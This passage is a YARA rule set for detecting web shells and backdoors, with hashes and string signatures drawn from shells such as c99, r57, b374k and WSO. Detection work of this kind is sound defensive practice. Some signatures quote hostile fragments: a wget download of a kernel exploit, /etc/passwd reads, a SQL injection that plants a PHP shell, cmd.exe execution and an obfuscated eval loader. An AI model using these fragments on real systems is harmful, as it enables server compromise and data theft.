hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
strings:
$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
condition:
filesize < 685KB and 1 of them
}
rule SSC_webshell_NetworkFileManagerPHP {
meta:
description = "Web Shell - file NetworkFileManagerPHP.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
strings:
$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
condition:
all of them
}
rule SSC_php_killnc : webshell {
meta:
description = "Laudanum Injector Tools - file killnc.php"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
strings:
$s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
$s3 = "<?php echo exec('killall nc');?>" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "<title>Laudanum Kill nc</title>" fullword ascii /* PEStudio Blacklist: strings */
$s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
condition:
filesize < 15KB and 4 of them
}
rule SSC_WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz {
meta:
description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
author = "Florian Roth"
hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
strings:
$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
$s11 = "directory... Trust me - it works :-) */" fullword
$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
$s16 = "} else if ($command == 'ls') {" fullword
condition:
3 of them
}
rule SSC_hkshell_hkshell {
meta:
description = "Webshells Auto-generated - file hkshell.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "168cab58cee59dc4706b3be988312580"
strings:
$s1 = "PrSessKERNELU"
$s2 = "Cur3ntV7sion"
$s3 = "Explorer8"
condition:
all of them
}
rule SSC_webshell_jsp_hsxa {
meta:
description = "Web Shell - file hsxa.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
strings:
$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
condition:
all of them
}
rule SSC_WebShell_DTool_Pro {
meta:
description = "PHP Webshells Github Archive - file DTool Pro.php"
author = "Florian Roth"
hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
strings:
$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword
condition:
3 of them
}
rule SSC_FSO_s_casus15 {
meta:
description = "Webshells Auto-generated - file casus15.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8d155b4239d922367af5d0a1b89533a3"
strings:
$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
condition:
all of them
}
rule SSC_WebShell_indexer_asp_php {
meta:
description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
author = "Florian Roth"
hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
strings:
$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
$s4 = "<form action=\"?oku\" method=\"post\">" fullword
$s7 = "var message=\"SaNaLTeRoR - " fullword
$s8 = "nDexEr - Reader\"" fullword
condition:
3 of them
}
rule SSC_iMHaPFtp {
meta:
description = "Webshells Auto-generated - file iMHaPFtp.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "12911b73bc6a5d313b494102abcf5c57"
strings:
$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
condition:
all of them
}
rule SSC_webshell_php_h6ss {
meta:
description = "Web Shell - file h6ss.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "272dde9a4a7265d6c139287560328cd5"
strings:
$s0 = "<?php eval(gzuncompress(base64_decode(\""
condition:
all of them
}
rule SSC_webshell_PHP_co {
meta:
description = "Web Shell - file co.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "62199f5ac721a0cb9b28f465a513874c"
strings:
$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
condition:
all of them
}
rule SSC_hxdef100_2 {
meta:
description = "Webshells Auto-generated - file hxdef100.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
strings:
$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
condition:
all of them
}
rule SSC_WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah {
meta:
description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
author = "Florian Roth"
super_rule = 1
hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"
strings:
$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
$s3 = "$dt = $_POST['filecontent'];" fullword
$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
$s6 = "print \"Sorry, none of the command functions works.\";" fullword
$s11 = "document.cmdform.command.value='';" fullword
$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
condition:
3 of them
}
rule SSC_WebShell_toolaspshell {
meta:
description = "PHP Webshells Github Archive - file toolaspshell.php"
author = "Florian Roth"
hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
strings:
$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
condition:
2 of them
}
rule SSC_webshell_spjspshell {
meta:
description = "Web Shell - file spjspshell.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d39d51154aaad4ba89947c459a729971"
strings:
$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
condition:
all of them
}
rule SSC_Webshell_c100 {
meta:
description = "Detects Webshell - rule generated from from files c100 v. 777shell"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
strings:
$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
$s4 = "which wget curl w3m lynx" ascii
$s6 = "netstat -atup | grep IST"  ascii
condition:
filesize < 685KB and 2 of them
}
rule SSC_backdoorfr_php {
meta:
description = "Semi-Auto-generated  - file backdoorfr.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "91e4afc7444ed258640e85bcaf0fecfc"
strings:
$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
condition:
1 of them
}
rule SSC_multiple_webshells_0025 {
meta:
description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_c99shell_v1_0_php_php_c99php_SsEs_php_php"
hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
strings:
$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
condition:
1 of them
}
rule SSC_mysql_php_php {
meta:
description = "Semi-Auto-generated  - file mysql.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "12bbdf6ef403720442a47a3cc730d034"
strings:
$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
condition:
1 of them
}
rule SSC_xssshell {
meta:
description = "Webshells Auto-generated - file xssshell.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
strings:
$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
condition:
all of them
}
rule SSC_WebShell_php_webshells_pHpINJ {
meta:
description = "PHP Webshells Github Archive - file pHpINJ.php"
author = "Florian Roth"
hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
strings:
$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
condition:
1 of them
}
rule SSC_multiple_webshells_0020 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
strings:
$s0 = "@ini_set(\"highlight" fullword
$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
condition:
2 of them
}
rule SSC_WebShell_aZRaiLPhp_v1_0 {
meta:
description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
author = "Florian Roth"
hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
strings:
$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
condition:
2 of them
}
rule SSC_WebShell_ZyklonShell {
meta:
description = "PHP Webshells Github Archive - file ZyklonShell.php"
author = "Florian Roth"
hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
strings:
$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
$s2 = "<TITLE>404 Not Found</TITLE>" fullword
$s3 = "<H1>Not Found</H1>" fullword
condition:
all of them
}
rule SSC_aspydrv_asp {
meta:
description = "Semi-Auto-generated  - file aspydrv.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "1c01f8a88baee39aa1cebec644bbcb99"
score = 60
strings:
$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
$s1 = "password"
$s2 = "session(\"shagman\")="
condition:
2 of them
}
rule SSC_webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
meta:
description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "64a3bf9142b045b9062b204db39d4d57"
hash1 = "9abd397c6498c41967b4dd327cf8b55a"
hash2 = "56c005690da2558690c4aa305a31ad37"
hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
hash4 = "532b93e02cddfbb548ce5938fe2f5559"
hash5 = "6e0fa491d620d4af4b67bae9162844ae"
hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
strings:
$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
$s6 = "password = (String)session.getAttribute(\"password\");" fullword
$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
condition:
2 of them
}
rule SSC_EFSO_2_asp {
meta:
description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b5fde9682fd63415ae211d53c6bfaa4d"
strings:
$s0 = "Ejder was HERE"
$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
condition:
2 of them
}
rule SSC_webshell_B374kPHP_B374k {
meta:
description = "Web Shell - file B374k.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "bed7388976f8f1d90422e8795dff1ea6"
strings:
$s0 = "Http://code.google.com/p/b374k-shell" fullword
$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
$s4 = "B374k Vip In Beautify Just For Self" fullword
condition:
1 of them
}
rule SSC_Dx_php_php {
meta:
description = "Semi-Auto-generated  - file Dx.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
strings:
$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
condition:
1 of them
}
rule SSC_webshell_jsp_hsxa1 {
meta:
description = "Web Shell - file hsxa1.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5686d5a38c6f5b8c55095af95c2b0244"
strings:
$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
condition:
all of them
}
rule SSC_webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
meta:
description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "7066f4469c3ec20f4890535b5f299122"
hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
hash3 = "8979594423b68489024447474d113894"
hash4 = "ec482fc969d182e5440521c913bab9bd"
hash5 = "f98d2b33cd777e160d1489afed96de39"
hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
hash7 = "e9a5280f77537e23da2545306f6a19ad"
strings:
$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
$s2 = " KB </td>" fullword
$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
$s4 = "<!-- <tr align=\"center\"> " fullword
condition:
all of them
}
rule SSC_webshell_ELMALISEKER_Backd00r {
meta:
description = "Web Shell - file ELMALISEKER Backd00r.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
strings:
$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
condition:
all of them
}
rule SSC_multiple_webshells_0010 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_wacking_php_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "9c5bb5e3a46ec28039e8986324e42792"
hash2 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
$s2 = "c99sh_sqlquery"
condition:
1 of them
}
rule SSC_webshell_wso2_5_1_wso2_5_wso2 {
meta:
description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "dbeecd555a2ef80615f0894027ad75dc"
hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
hash2 = "cbc44fb78220958f81b739b493024688"
strings:
$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
condition:
all of them
}
rule SSC_rdrbs100 {
meta:
description = "Webshells Auto-generated - file rdrbs100.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "7c752bcd6da796d80a6830c61a632bff"
strings:
$s3 = "Server address must be IP in A.B.C.D format."
$s4 = " mapped ports in the list. Currently "
condition:
all of them
}
rule SSC_webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
meta:
description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "ae025c886fbe7f9ed159f49593674832"
hash1 = "513b7be8bd0595c377283a7c87b44b2e"
hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
hash4 = "3f71175985848ee46cc13282fbed2269"
strings:
$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
condition:
2 of them
}
rule SSC_mysql_tool_php_php {
meta:
description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5fbe4d8edeb2769eda5f4add9bab901e"
strings:
$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
$s4 = "<div align=\"center\">The backup process has now started<br "
condition:
1 of them
}
rule SSC_SetupBDoor {
meta:
description = "Webshells Auto-generated - file SetupBDoor.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "41f89e20398368e742eda4a3b45716b6"
strings:
$s1 = "\\BDoor\\SetupBDoor"
condition:
all of them
}
rule SSC_webshell_itsec_PHPJackal_itsecteam_shell_jHn {
meta:
description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "8ae9d2b50dc382f0571cd7492f079836"
hash1 = "e2830d3286001d1455479849aacbbb38"
hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
hash3 = "40c6ecf77253e805ace85f119fe1cebb"
strings:
$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
condition:
2 of them
}
rule SSC_WebShell_Generic_PHP_1 {
meta:
description = "PHP Webshells Github Archive - from files Dive Shell 1.0 - Emperor Hacking Team.php, Dive_Shell_1.0_Emperor_Hacking_Team.php, SimShell 1.0 - Simorgh Security MGZ.php, SimShell_1.0_-_Simorgh_Security_MGZ.php"
author = "Florian Roth"
super_rule = 1
hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"
strings:
$s1 = "$token = substr($_REQUEST['command'], 0, $length);" fullword
$s4 = "var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword
$s7 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword
$s9 = "document.shell.command.value = command_hist[current_line];" fullword
$s16 = "$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $"
$s19 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {" fullword
$s20 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword
condition:
5 of them
}
rule SSC_webshell_asp_ntdaddy {
meta:
description = "Web Shell - file ntdaddy.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "c5e6baa5d140f73b4e16a6cfde671c68"
strings:
$s9 =  "if  FP  =  \"RefreshFolder\"  or  "
$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
condition:
1 of them
}
rule SSC_webshell_jsp_list {
meta:
description = "Web Shell - file list.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "1ea290ff4259dcaeb680cec992738eda"
strings:
$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
condition:
all of them
}
rule SSC_DTool_Pro_php {
meta:
description = "Semi-Auto-generated  - file DTool Pro.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "366ad973a3f327dfbfb915b0faaea5a6"
strings:
$s0 = "r3v3ng4ns\\nDigite"
$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
condition:
1 of them
}
rule SSC_webshell_jsp_123 {
meta:
description = "Web Shell - file 123.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "c691f53e849676cac68a38d692467641"
strings:
$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
condition:
all of them
}
rule SSC_chinese_spam_spreader : webshell
{
meta:
author      = "Vlad https://github.com/vlad-s"
date        = "2016/07/18"
description = "Catches chinese PHP spam files (autospreaders)"
strings:
$a = "User-Agent: aQ0O010O"
$b = "<font color='red'><b>Connection Error!</b></font>"
$c = /if ?\(\$_POST\[Submit\]\) ?{/
condition:
all of them
}
rule SSC_webshell_asp_cmd : webshell {
meta:
description = "Web Shell - file cmd.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "895ca846858c315a3ff8daa7c55b3119"
strings:
$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
condition:
1 of them
}
rule SSC_shelltools_g0t_root_Fport {
meta:
description = "Webshells Auto-generated - file Fport.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "dbb75488aa2fa22ba6950aead1ef30d5"
strings:
$s4 = "Copyright 2000 by Foundstone, Inc."
$s5 = "You must have administrator privileges to run fport - exiting..."
condition:
all of them
}
rule SSC_cyberlords_sql_php_php {
meta:
description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "03b06b4183cb9947ccda2c3d636406d4"
strings:
$s0 = "Coded by n0 [nZer0]"
$s1 = " www.cyberlords.net"
$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
condition:
1 of them
}
rule SSC_WebShell__CrystalShell_v_1_erne_stres {
meta:
description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
author = "Florian Roth"
super_rule = 1
hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
strings:
$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
$s4 = "var_dump(curl_exec($ch));" fullword
$s7 = "if(empty($_POST['Mohajer22'])){" fullword
$s10 = "$m=$_POST['curl'];" fullword
$s13 = "$u1p=$_POST['copy'];" fullword
$s14 = "if(empty(\\$_POST['cmd'])){" fullword
$s15 = "$string = explode(\"|\",$string);" fullword
$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword
condition:
5 of them
}
rule SSC_klasvayv_asp {
meta:
description = "Semi-Auto-generated  - file klasvayv.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "2b3e64bf8462fc3d008a3d1012da64ef"
strings:
$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
$s3 = "<font color=\"#858585\">www.aventgrup.net"
$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
condition:
1 of them
}
